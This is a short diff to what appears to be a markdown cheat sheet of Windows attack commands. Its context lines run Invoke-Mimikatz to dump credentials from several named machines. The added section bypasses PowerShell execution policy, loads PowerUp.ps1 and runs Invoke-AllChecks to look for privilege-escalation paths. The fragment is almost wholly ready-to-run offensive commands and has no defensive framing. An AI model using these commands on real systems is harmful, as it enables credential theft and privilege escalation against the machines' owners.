@@ -146,3 +146,11 @@ Dump Creds from multiple machines
 ```
 Invoke-Mimikatz -DumpCreds -ComputerName @("instance1", "instance2")
 ```
+
+## Load PowerUp
+
+```
+powershell -ExecutionPolicy Bypass
+Import-Module ./PowerUp.ps1​
+Invoke-AllChecks​
+```
